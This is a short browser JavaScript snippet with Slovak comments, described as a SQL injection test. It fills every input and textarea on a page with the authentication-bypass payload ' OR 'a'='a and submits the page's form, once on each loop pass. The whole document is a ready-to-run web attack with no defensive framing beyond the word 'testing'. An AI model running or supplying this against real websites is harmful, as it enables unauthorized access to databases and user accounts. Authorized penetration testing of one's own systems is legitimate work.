(function() {
  // Funkcia na testovanie SQL Injection
  const sqlPayloads = [
    "' OR 'a'='a"
  ];

  const formInputs = document.querySelectorAll('input, textarea');
  formInputs.forEach(input => {
    // Vložte SQL injection do vstupného poľa
    input.value = sqlPayloads[0];  // Používa prvý payload z poľa

    // Môžete pridať logiku na overenie reakcie po odoslaní formulára
    const form = document.querySelector('form');
    if (form) {
      form.submit();  // Odoslať formulár
    }
  });
})();
